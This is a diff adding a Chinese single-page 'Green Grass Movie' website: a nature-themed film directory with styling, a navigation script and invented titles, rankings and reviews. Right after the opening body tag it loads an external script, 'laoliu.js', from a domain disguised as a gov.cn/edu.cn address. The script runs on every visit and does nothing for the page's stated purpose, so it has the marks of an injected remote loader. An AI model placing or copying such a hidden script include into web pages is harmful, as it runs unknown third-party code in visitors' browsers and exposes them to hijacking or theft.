@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>青草电影网 - 像草一样生长，像风一样看电影 | qingcaodianyingwang-h5.github.io</title>
+<meta name="description" content="青草电影网（https://qingcaodianyingwang-h5.github.io）是一个清新自然的电影导航站：新片、治愈、纪录片、动画、影评、榜单，像在草地上翻一本电影书。">
+<meta name="keywords" content="青草电影网,清新电影,治愈电影,自然纪录片,动画短片,影评,qingcaodianyingwang-h5.github.io">
+<meta property="og:title" content="青草电影网 - 像草一样生长，像风一样看电影">
+<meta property="og:description" content="新片、治愈、纪录片、动画、影评、榜单，清新自然的单页电影站。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://qingcaodianyingwang-h5.github.io">
+<link rel="canonical" href="https://qingcaodianyingwang-h5.github.io">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --grass:#4caf50;--grass2:#388e3c;--mint:#a5d6a7;--mint2:#e8f5e9;--cream:#fdfdf7;
+  --ink:#1b3a1a;--ink2:#2e5c2e;--soil:#5d4037;--soil2:#8d6e63;--line:rgba(76,175,80,.22);
+  --card:#ffffff;--shadow:0 8px 28px rgba(46,92,46,.12);
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Noto Sans SC",system-ui,sans-serif;
+  background:
+    radial-gradient(900px 400px at 85% -10%,rgba(165,214,167,.35),transparent 60%),
+    radial-gradient(700px 400px at -10% 15%,rgba(232,245,233,.8),transparent 55%),
+    var(--cream);
+  color:var(--ink);line-height:1.7;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+
+/* 草地波浪顶 */
+.grass-top{height:28px;background:
+  radial-gradient(ellipse 50px 14px at 50% 100%,var(--grass),transparent),
+  radial-gradient(ellipse 30px 10px at 20% 100%,var(--mint),transparent),
+  radial-gradient(ellipse 40px 12px at 80% 100%,var(--grass2),transparent);
+  opacity:.55}
+
+/* header */
+.site-header{position:sticky;top:0;z-index:50;background:rgba(253,253,247,.88);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:62px}
+.brand{font-weight:900;font-size:1.35rem;letter-spacing:.5px}
+.brand b{color:var(--grass2)}
+.nav ul{display:flex;gap:6px;list-style:none}
+.nav a{padding:8px 12px;border-radius:999px;font-size:.9rem;color:var(--ink2);transition:.25s}
+.nav a:hover,.nav a.active{background:var(--grass);color:#fff;box-shadow:0 6px 18px rgba(76,175,80,.32)}
+.menu-btn{display:none;flex-direction:column;gap:5px;background:none;border:0;cursor:pointer;padding:8px}
+.menu-btn span{width:24px;height:2px;background:var(--ink2);border-radius:2px}
+
+/* hero */
+.hero{position:relative;padding:64px 0 42px}
+.hero h1{font-size:clamp(2rem,5vw,3.3rem);line-height:1.12;font-weight:900}
+.hero h1 em{font-style:normal;color:var(--grass2)}
+.hero p{margin-top:16px;max-width:620px;color:var(--ink2);font-size:1.02rem}
+.hero .chips{margin-top:22px;display:flex;flex-wrap:wrap;gap:10px}
+.chip{padding:7px 14px;border:1px solid var(--line);border-radius:999px;background:var(--card);font-size:.82rem;color:var(--ink2)}
+/* 微风叶子装饰 */
+.breeze{position:absolute;right:-20px;top:40px;width:180px;height:180px;opacity:.15;animation:float 6s ease-in-out infinite}
+@keyframes float{0%,100%{transform:translateY(0) rotate(0)}50%{transform:translateY(-20px) rotate(5deg)}}
+
+/* section */
+section.block{padding:54px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px}
+.sec-head h2{font-size:1.7rem;font-weight:900}
+.sec-head h2 i{color:var(--grass2);margin-right:8px}
+.sec-head span{color:var(--ink2);font-size:.85rem}
+
+/* 1 手绘卡片：新片 */
+.sketch{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.card{
+  background:var(--card);border:2px solid var(--line);border-radius:18px;padding:20px 18px;
+  box-shadow:var(--shadow);position:relative;opacity:0;transform:translateY(20px);transition:.6s cubic-bezier(.2,.7,.2,1);
+}
+.card.in{opacity:1;transform:none}
+.card:hover{transform:translateY(-6px);border-color:var(--grass)}
+.card .emoji{font-size:2rem;margin-bottom:10px}
+.card h3{font-size:1rem;margin-bottom:6px}
+.card p{font-size:.78rem;color:var(--ink2);margin-bottom:8px}
+.card .tag{display:inline-block;padding:3px 10px;background:var(--mint2);color:var(--grass2);font-size:.72rem;border-radius:999px;font-weight:600}
+.card::before{content:"";position:absolute;top:-8px;left:20px;width:30px;height:16px;background:var(--grass);border-radius:0 0 15px 15px;opacity:.3}
+
+/* 2 藤蔓列表：纪录片 */
+.vines{max-width:860px}
+.vine{
+  display:flex;gap:18px;align-items:flex-start;padding:18px 20px;background:var(--card);
+  border:1px solid var(--line);border-radius:14px;margin-bottom:14px;
+  opacity:0;transform:translateX(-20px);transition:.5s;position:relative;
+}
+.vine.in{opacity:1;transform:none}
+.vine::before{content:"";position:absolute;left:8px;top:0;bottom:0;width:3px;background:linear-gradient(var(--mint),var(--grass));border-radius:2px}
+.vine .num{font-weight:900;color:var(--grass2);min-width:48px;font-size:1.1rem;padding-left:14px}
+.vine h4{font-size:1rem;margin-bottom:4px}
+.vine p{font-size:.8rem;color:var(--ink2)}
+
+/* 3 横向卷轴：动画 */
+.grassrow{display:flex;gap:16px;overflow-x:auto;padding:6px 2px 18px;scroll-snap-type:x mandatory}
+.grassrow::-webkit-scrollbar{height:8px}
+.grassrow::-webkit-scrollbar-thumb{background:var(--line);border-radius:8px}
+.anim{flex:0 0 260px;scroll-snap-align:start;background:var(--card);border:2px solid var(--line);border-radius:20px;overflow:hidden;box-shadow:var(--shadow)}
+.anim .top{height:130px;background:linear-gradient(135deg,var(--mint),var(--grass))}
+.anim .body{padding:14px}
+.anim .body h4{font-size:.98rem}
+.anim .body p{font-size:.76rem;color:var(--ink2);margin-top:4px}
+.anim .leaf-tag{display:inline-block;margin-top:8px;font-size:.7rem;background:var(--grass2);color:#fff;padding:3px 10px;border-radius:999px}
+
+/* 4 种子进度：影评 */
+.seeds{max-width:820px}
+.seed{
+  display:flex;gap:16px;align-items:center;padding:16px 18px;background:var(--card);
+  border:1px solid var(--line);border-radius:14px;margin-bottom:14px;
+  opacity:0;transform:translateY(16px);transition:.5s;
+}
+.seed.in{opacity:1;transform:none}
+.seed .icon{width:44px;height:44px;border-radius:50%;background:var(--mint2);display:grid;place-items:center;font-size:1.3rem;flex-shrink:0}
+.seed h4{font-size:.98rem;margin-bottom:4px}
+.seed-bar{flex:1;height:8px;background:var(--mint2);border-radius:999px;overflow:hidden;margin-top:6px}
+.seed-fill{height:100%;background:linear-gradient(90deg,var(--mint),var(--grass2));border-radius:999px;transition:width 1.2s ease}
+.seed .val{font-weight:800;color:var(--grass2);min-width:44px;text-align:right;font-size:.9rem}
+
+/* 5 花瓣网格：剧集 */
+.petals{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.petal{
+  border-radius:24px;padding:24px;color:#fff;min-height:170px;position:relative;overflow:hidden;
+  opacity:0;transform:scale(.94);transition:.5s;
+}
+.petal.in{opacity:1;transform:none}
+.petal.a{background:linear-gradient(135deg,var(--grass),var(--grass2))}
+.petal.b{background:linear-gradient(135deg,#66bb6a,#2e7d32)}
+.petal.c{background:linear-gradient(135deg,#81c784,#1b5e20)}
+.petal h3{font-size:1.15rem;margin-bottom:8px}
+.petal p{font-size:.82rem;opacity:.92}
+.petal::after{content:"🌿";position:absolute;bottom:-10px;right:-10px;font-size:4rem;opacity:.2}
+
+/* 6 露珠榜单 */
+.dew{max-width:760px;margin:0 auto}
+.drop{
+  display:flex;align-items:center;gap:16px;padding:16px 18px;background:var(--card);
+  border:2px solid var(--line);border-radius:18px;margin-bottom:14px;
+  opacity:0;transform:translateY(14px);transition:.5s;
+}
+.drop.in{opacity:1;transform:none}
+.drop:hover{border-color:var(--grass);box-shadow:var(--shadow)}
+.drop-rank{width:42px;height:42px;border-radius:50%;display:grid;place-items:center;font-weight:900;font-size:1.1rem}
+.drop:nth-child(1) .drop-rank{background:var(--grass);color:#fff}
+.drop:nth-child(2) .drop-rank{background:#a5d6a7;color:var(--ink)}
+.drop:nth-child(3) .drop-rank{background:var(--soil2);color:#fff}
+.drop:nth-child(n+4) .drop-rank{background:var(--mint2);color:var(--grass2)}
+.drop-info{flex:1}
+.drop-info h4{font-size:.98rem}
+.drop-bar{height:8px;background:var(--mint2);border-radius:999px;overflow:hidden;margin-top:8px}
+.drop-fill{height:100%;background:linear-gradient(90deg,var(--mint),var(--grass2));border-radius:999px;transition:width 1.2s ease}
+.drop-score{font-weight:900;color:var(--grass2);font-size:1.1rem}
+
+/* footer */
+.site-footer{margin-top:40px;background:var(--ink);color:#e8f5e9;padding:36px 0 26px}
+.foot{display:flex;flex-wrap:wrap;gap:20px;justify-content:space-between;align-items:center}
+.foot .links{display:flex;flex-wrap:wrap;gap:14px;font-size:.85rem}
+.foot .links a:hover{color:var(--grass)}
+.foot small{display:block;margin-top:14px;opacity:.82;font-size:.78rem;line-height:1.7}
+
+@media(max-width:980px){.sketch{grid-template-columns:repeat(2,1fr)}.petals{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:680px){
+  .menu-btn{display:flex}
+  .nav ul{position:absolute;top:62px;left:0;right:0;background:var(--cream);flex-direction:column;padding:10px 18px 18px;gap:6px;border-bottom:1px solid var(--line);transform:translateY(-160%);transition:.35s}
+  .nav ul.open{transform:none}
+  .sketch{grid-template-columns:1fr 1fr}
+  .petals{grid-template-columns:1fr}
+  .breeze{display:none}
+  .sec-head{flex-direction:column;align-items:flex-start}
+}
+@media(max-width:420px){.sketch{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="grass-top"></div>
+
+<header class="site-header">
+  <div class="wrap nav">
+    <div class="brand">青草<b>电影网</b></div>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单"><span></span><span></span><span></span></button>
+    <nav>
+      <ul id="navUl">
+        <li><a href="#new" class="active">新芽推荐</a></li>
+        <li><a href="#doc">藤蔓纪录</a></li>
+        <li><a href="#anim">草地动画</a></li>
+        <li><a href="#review">种子影评</a></li>
+        <li><a href="#series">花瓣剧集</a></li>
+        <li><a href="#rank">露珠榜单</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <section class="hero wrap">
+    <svg class="breeze" viewBox="0 0 100 100"><text x="50" y="55" text-anchor="middle" font-size="60">🌿</text></svg>
+    <h1>像草一样生长，<br><em>像风一样看电影。</em></h1>
+    <p>青草电影网（qingcaodianyingwang-h5.github.io）是一个清新自然的电影站：新片、治愈、纪录片、动画、影评、榜单，像在草地上翻一本电影书，不赶时间。</p>
+    <div class="chips">
+      <span class="chip">🌱 新芽推荐</span>
+      <span class="chip">🌿 藤蔓纪录</span>
+      <span class="chip">🍃 草地动画</span>
+      <span class="chip">🌰 种子影评</span>
+      <span class="chip">🌸 花瓣剧集</span>
+      <span class="chip">💧 露珠榜单</span>
+    </div>
+  </section>
+
+  <!-- 1 新芽推荐 -->
+  <section class="block wrap" id="new">
+    <div class="sec-head"><h2><i>🌱</i> 新芽推荐</h2><span>刚冒出来的好片子</span></div>
+    <div class="sketch">
+      <article class="card"><div class="emoji">🎋</div><h3>竹林深处</h3><p>纪录片 / 2025 / 88分钟</p><span class="tag">自然 · 治愈</span></article>
+      <article class="card"><div class="emoji">🌻</div><h3>向日葵之夏</h3><p>剧情 / 2024 / 112分钟</p><span class="tag">成长 · 温情</span></article>
+      <article class="card"><div class="emoji">🦋</div><h3>蝴蝶效应日记</h3><p>奇幻 / 2025 / 105分钟</p><span class="tag">时间 · 选择</span></article>
+      <article class="card"><div class="emoji">🌊</div><h3>潮汐来信</h3><p>爱情 / 2024 / 98分钟</p><span class="tag">海洋 · 思念</span></article>
+      <article class="card"><div class="emoji">🍄</div><h3>蘑菇森林奇遇</h3><p>动画 / 2025 / 76分钟</p><span class="tag">奇幻 · 冒险</span></article>
+      <article class="card"><div class="emoji">🪴</div><h3>阳台上的春天</h3><p>喜剧 / 2024 / 101分钟</p><span class="tag">生活 · 幽默</span></article>
+      <article class="card"><div class="emoji">🌾</div><h3>麦田守望者</h3><p>剧情 / 2025 / 124分钟</p><span class="tag">乡村 · 坚守</span></article>
+      <article class="card"><div class="emoji">🍀</div><h3>四叶草的约定</h3><p>青春 / 2024 / 96分钟</p><span class="tag">校园 · 约定</span></article>
+    </div>
+  </section>
+
+  <!-- 2 藤蔓纪录 -->
+  <section class="block wrap" id="doc">
+    <div class="sec-head"><h2><i>🌿</i> 藤蔓纪录片</h2><span>慢慢长，慢慢看</span></div>
+    <div class="vines">
+      <div class="vine"><div class="num">01</div><div><h4>地球呼吸：森林篇</h4><p>跟拍三年，记录一片原始森林的四季呼吸，听见树木之间的对话。</p></div></div>
+      <div class="vine"><div class="num">02</div><div><h4>种子漂流记</h4><p>一颗橡果如何跨越山河，落地生根，长成参天大树——用微距镜头讲述。</p></div></div>
+      <div class="vine"><div class="num">03</div><div><h4>湿地之歌</h4><p>候鸟迁徙路线上的湿地生态，人与自然的微妙平衡，温柔而震撼。</p></div></div>
+      <div class="vine"><div class="num">04</div><div><h4>城市里的野花</h4><p>在钢筋水泥缝隙中生长的野花，它们如何适应城市，开出自己的春天。</p></div></div>
+      <div class="vine"><div class="num">05</div><div><h4>蜜蜂的地图</h4><p>一只蜜蜂的采蜜路线，串联起整片山谷的植物生态链。</p></div></div>
+    </div>
+  </section>
+
+  <!-- 3 草地动画 -->
+  <section class="block wrap" id="anim">
+    <div class="sec-head"><h2><i>🍃</i> 草地动画</h2><span>左右滑动，像风吹过草尖</span></div>
+    <div class="grassrow">
+      <div class="anim"><div class="top"></div><div class="body"><h4>小芽的旅行</h4><p>一颗种子从发芽到开花的奇幻旅程</p><span class="leaf-tag">治愈 · 8.9分</span></div></div>
+      <div class="anim"><div class="top"></div><div class="body"><h4>风之谷的邮差</h4><p>在风里传递信件的精灵，每次飞行都是一次冒险</p><span class="leaf-tag">冒险 · 8.7分</span></div></div>
+      <div class="anim"><div class="top"></div><div class="body"><h4>萤火虫之森</h4><p>夏夜森林里，萤火虫照亮了迷路孩子的归途</p><span class="leaf-tag">温情 · 9.1分</span></div></div>
+      <div class="anim"><div class="top"></div><div class="body"><h4>蒲公英的约定</h4><p>一朵蒲公英和风约定，要把种子送到最美的山谷</p><span class="leaf-tag">唯美 · 8.8分</span></div></div>
+      <div class="anim"><div class="top"></div><div class="body"><h4>蜗牛的马拉松</h4><p>一只蜗牛参加森林马拉松，慢也有慢的风景</p><span class="leaf-tag">励志 · 8.5分</span></div></div>
+      <div class="anim"><div class="top"></div><div class="body"><h4>雨后的彩虹桥</h4><p>雨后小动物们搭建彩虹桥，连接被雨水隔断的家</p><span class="leaf-tag">友情 · 8.6分</span></div></div>
+    </div>
+  </section>
+
+  <!-- 4 种子影评 -->
+  <section class="block wrap" id="review">
+    <div class="sec-head"><h2><i>🌰</i> 种子影评</h2><span>埋下一颗想法，等它发芽</span></div>
+    <div class="seeds">
+      <div class="seed"><div class="icon">🌱</div><div class="flex-1"><h4>为什么自然纪录片让人平静？</h4><div class="seed-bar"><div class="seed-fill" data-w="94%"></div></div></div><div class="val">94%</div></div>
+      <div class="seed"><div class="icon">🍃</div><div class="flex-1"><h4>治愈动画的底层逻辑：慢节奏+自然音效</h4><div class="seed-bar"><div class="seed-fill" data-w="89%"></div></div></div><div class="val">89%</div></div>
+      <div class="seed"><div class="icon">🌿</div><div class="flex-1"><h4>乡村电影为什么总让人想哭？</h4><div class="seed-bar"><div class="seed-fill" data-w="86%"></div></div></div><div class="val">86%</div></div>
+      <div class="seed"><div class="icon">🌸</div><div class="flex-1"><h4>春天适合看什么类型的电影？</h4><div class="seed-bar"><div class="seed-fill" data-w="82%"></div></div></div><div class="val">82%</div></div>
+      <div class="seed"><div class="icon">💧</div><div class="flex-1"><h4>水元素在电影中的情绪表达</h4><div class="seed-bar"><div class="seed-fill" data-w="78%"></div></div></div><div class="val">78%</div></div>
+    </div>
+  </section>
+
+  <!-- 5 花瓣剧集 -->
+  <section class="block wrap" id="series">
+    <div class="sec-head"><h2><i>🌸</i> 花瓣剧集</h2><span>一层一层，慢慢绽放</span></div>
+    <div class="petals">
+      <article class="petal a"><h3>🌻 向日葵小镇</h3><p>一个小镇上每个人都在种向日葵，直到有一天花都不开了——单元治愈剧，全12集。</p></article>
+      <article class="petal b"><h3>🍀 四叶草咖啡馆</h3><p>咖啡馆里每天来一个带着故事的人，老板用一杯咖啡换一个秘密——全10集。</p></article>
+      <article class="petal c"><h3>🌾 麦田守望者联盟</h3><p>几个年轻人回到乡村守护麦田，对抗开发商的故事——全16集，热血又治愈。</p></article>
+    </div>
+  </section>
+
+  <!-- 6 露珠榜单 -->
+  <section class="block wrap" id="rank">
+    <div class="sec-head"><h2><i>💧</i> 露珠榜单</h2><span>清晨最纯净的观影选择</span></div>
+    <div class="dew">
+      <div class="drop"><div class="drop-rank">1</div><div class="drop-info"><h4>竹林深处</h4><div class="drop-bar"><div class="drop-fill" data-w="98%"></div></div></div><div class="drop-score">9.8</div></div>
+      <div class="drop"><div class="drop-rank">2</div><div class="drop-info"><h4>萤火虫之森</h4><div class="drop-bar"><div class="drop-fill" data-w="95%"></div></div></div><div class="drop-score">9.5</div></div>
+      <div class="drop"><div class="drop-rank">3</div><div class="drop-info"><h4>向日葵之夏</h4><div class="drop-bar"><div class="drop-fill" data-w="92%"></div></div></div><div class="drop-score">9.2</div></div>
+      <div class="drop"><div class="drop-rank">4</div><div class="drop-info"><h4>地球呼吸：森林篇</h4><div class="drop-bar"><div class="drop-fill" data-w="89%"></div></div></div><div class="drop-score">8.9</div></div>
+      <div class="drop"><div class="drop-rank">5</div><div class="drop-info"><h4>小芽的旅行</h4><div class="drop-bar"><div class="drop-fill" data-w="86%"></div></div></div><div class="drop-score">8.6</div></div>
+      <div class="drop"><div class="drop-rank">6</div><div class="drop-info"><h4>潮汐来信</h4><div class="drop-bar"><div class="drop-fill" data-w="83%"></div></div></div><div class="drop-score">8.3</div></div>
+    </div>
+  </section>
+</main>
+
+<footer class="site-footer">
+  <div class="wrap foot">
+    <div>
+      <div class="brand" style="color:#fff">青草<b style="color:var(--grass)">电影网</b></div>
+      <small>网站名称：青草电影网<br>网站网址：https://qingcaodianyingwang-h5.github.io<br>像草一样生长，像风一样看电影。</small>
+    </div>
+    <div class="links">
+      <a href="#new">新芽推荐</a>
+      <a href="#doc">藤蔓纪录</a>
+      <a href="#anim">草地动画</a>
+      <a href="#review">种子影评</a>
+      <a href="#series">花瓣剧集</a>
+      <a href="#rank">露珠榜单</a>
+      <a href="#">关于青草</a>
+      <a href="#">免责声明</a>
+    </div>
+  </div>
+  <div class="wrap"><small>© 2026 青草电影网 保留所有权利。单页演示，内页链接均以 # 占位。</small></div>
+</main>
+
+<script>
+const menuBtn=document.getElementById('menuBtn');
+const navUl=document.getElementById('navUl');
+menuBtn.addEventListener('click',()=>navUl.classList.toggle('open'));
+navUl.querySelectorAll('a').forEach(a=>a.addEventListener('click',()=>navUl.classList.remove('open')));
+
+const secs=[...document.querySelectorAll('main section[id]')];
+const links=[...navUl.querySelectorAll('a')];
+addEventListener('scroll',()=>{
+  const y=scrollY+120;let id='';
+  secs.forEach(s=>{if(s.offsetTop<=y)id=s.id;});
+  links.forEach(a=>a.classList.toggle('active',a.getAttribute('href')==='#'+id));
+});
+
+const io=new IntersectionObserver((es)=>{
+  es.forEach(e=>{
+    if(e.isIntersecting){
+      e.target.classList.add('in');
+      e.target.querySelectorAll?.('.seed-fill,.drop-fill').forEach(b=>b.style.width=b.dataset.w);
+      io.unobserve(e.target);
+    }
+  });
+},{threshold:.15});
+document.querySelectorAll('.card,.vine,.anim,.seed,.petal,.drop').forEach(el=>io.observe(el));
+</script>
+</body>
+</html>
